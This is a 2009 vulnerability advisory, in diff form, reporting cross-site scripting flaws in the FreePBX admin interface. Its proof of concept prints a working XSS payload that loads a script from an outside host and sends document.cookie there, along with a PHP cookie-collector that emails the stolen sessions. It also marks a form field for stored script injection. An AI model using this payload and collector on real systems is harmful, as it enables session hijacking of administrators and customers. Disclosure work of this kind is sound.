@@ -1,0 +1,142 @@
+PenTest Information:
+====================
+Global-Evolution Security Team (~remove) discover multiple Vulnerabilities on PBX Phone System Application.
+An attacker can get sensitive customer/admin session-data over multiple Cross-Site-Scripting vulnerabilities.
+
+
+Details
+=======
+Tested on OS:		Windows 7 VBox
+Tested with Software:	Mozilla Firefox 3.5.x (Portable|Mod)
+
+Vulnerable Products: 	PBX Business Phone Application
+Affected Versions: 	v2.6.x & 2.5.2.x
+Vulnerability Type:	Multiple Cross Site Scripting (Server-Side & Client-Side)
+Security-Risk: 		Low & Medium (1.1 & 1.2)
+
+Vendor-URL: 		http://www.freepbx.org/
+Source-URL:		http://www.freepbx.org/download-freepbx
+
+Vendor-Status: 		Not Informed
+Patch/Fix-Status:	Fixed version not released
+Advisory-Status:	Published | 25.12.2009
+
+Advisory-URL: 		*censored
+Report-URL:		*censored
+
+GE DB-ID:           	()
+CVE-ID:             	()
+OSVDB-ID:           	()
+
+
+
+
+Introduction
+============
+It's Hard to Beat Free FreePBX is for both developers and people searching for a Business Phone System. 
+The new to FreePBX, Asterisk® or FreeSWITCH by PBX. FreePBX is an easy to use GUI (graphical user interface) 
+that controls and manages Asterisk, the world's most popular open source telephony engine software. FreePBX 
+has been developed and hardened by thousands of volunteers over tens of thousands man hours. FreePBX has been 
+downloaded over 5,000,000 times and estimates over 500,000 active phone systems. If you don't know about FreePBX, 
+you are probably paying too much for your phone system. Government in Europe & USA mostly use that Software to 
+configure Phone System inside of the offices.
+
+(Copy from the Vendor's Homepage: http://www.freepbx.org/)
+
+
+
+More Details
+============
+1.1
+Multiple XSS Vulnerabilities are detected on client-side(persistent). An attacker with low privilegs is able 
+to include own bad script routines on client-side(Example;PHP;JS) of the phone application. Attackers can get Session-Data(Cookies) 
+of customers/admins over multiple Cross Site Scripting Vulnerabilities.
+
+Vulnerable Module:	
+			[+] Trunk/Tech
+
+Path:	/admin/admin/	
+File:	config.php	
+Para:	?display=trunks&tech=
+
+
+1.2
+Multiple XSS Vulnerabilities are detected on server-side. An attacker with low privilegs is able 
+to include own bad script routines on server-side(Example;PHP;JS) of the phone application. Attackers can get Session-Data(Cookies) 
+of customers/admins over multiple Cross Site Scripting Vulnerabilities.
+
+Vulnerable Module:	
+			[+] Add Recordings
+			[+] Add Zap Channel
+
+Proof of Concept
+================
+This vulnerabilities can be exploited ...
+
+1.1
+
+location.href='https://127.0.0.1:8080/admin/admin/config.php?display=trunks&tech=%3C/script%3E%20%22%3E
+%3Cscript%20src%3Dhttp%3A//global-evolution.info/etc/grep.php%3E%3C/script%3E?nice='+escape(document.cookie)
+
+<?
+$cookie = $_GET['nice'];
+$ip = getenv("REMOTE_ADDR");
+$Time = date("l dS of F Y h:i:s A"); 
+$msg = "Cookie: $cookie\nIP Address: $ip\Time: $Time";
+$subject = "cookie";
+mail("notification@global-evolution.info", $subject, $msg);
+header ("location: http://127.0.0.1:8080/admin/");
+?>
+
+
+
+1.2
+
+<form name="editZapchandid" action="" method="post" onsubmit="return checkZapchandid(editZapchandid);">
+<input type="hidden" name="extdisplay" value="">
+<input type="hidden" name="channel" value="">
+<input type="hidden" name="action" value="add">
+<table><tr><td colspan="2"><h5>Add Channel<hr></h5></td></tr>
+<tr><td><a href="#" class="info">Channel:<span>The Zap Channel number to map to a DID</span></a></td>
+<td><input size="5" type="text" name="channel" value="" tabindex="1"></td>
+</tr><tr><td><a href="#" class="info">Description:<span>A useful description describing this channel</span></a></td>
+<td><input size="40" type="text" name="description" value="INSERT 0WN SCRIPTCODE HERE!!!" tabindex="2"></td>
+</tr><tr><td><a href="#" class="info">DID:<span>The DID that this channel represents. The incoming call on this channel 
+will be treated as if it came in with this DID and can be managed with Inbound Routing on DIDs</span></a></td>
+<td><input size="40" type="text" name="did" value=""  tabindex="3"/></td>
+</tr><tr><td colspan="2"><br><input name="Submit" type="submit" value="Submit Changes" tabindex="4">
+</td></tr></table></form>
+
+
+
+Fix / Patch
+============
+Restrict on the modules Zap Channel, Recordings & the Tech/Trunk input fields with a more 
+secure mask like (;:->"<'*",.[]) & format it with specialchars to get a secure output.  
+
+
+
+Security Risk
+=============
+1.1
+An attacker is able to get sessioninformation or include bad script routines with xss on client-side(not persistent). 
+The security risk is estimated as low because of client-side.
+
+1.2
+An attacker is able to get sessioninformation or include bad script routines with xss on server-side(persistent). 
+The security risk is estimated as medium because of server-side.
+
+
+
+Authors
+=======
+The author & writer is part of the private "Global-Evolution" Security(GESEC) Group. 
+GESEC Vulnerability-Research Team protects software, services, applications & informs the vendors on a secured base.
+More information about Global-Evolution Security ... global-evolution.info
+
+  ________.__        ___.          .__            ___________           .__          __  .__               
+ /  _____/|  |   ____\_ |__ _____  |  |           \_   _____/__  ______ |  |  __ ___/  |_|__| ____   ____  
+/   \  ___|  |  /  _ \| __ \\__  \ |  |    ______  |    __)_\  \/ /  _ \|  | |  |  \   __\  |/  _ \ /    \ (c)
+\    \_\  \  |_(  <_> ) \_\ \/ __ \|  |__ /_____/  |        \\   (  <_> )  |_|  |  /|  | |  (  <_> )   |  \
+ \______  /____/\____/|___  (____  /____/         /_______  / \_/ \____/|____/____/ |__| |__|\____/|___|  /
+        \/                \/     \/                       \/                                            \/ 
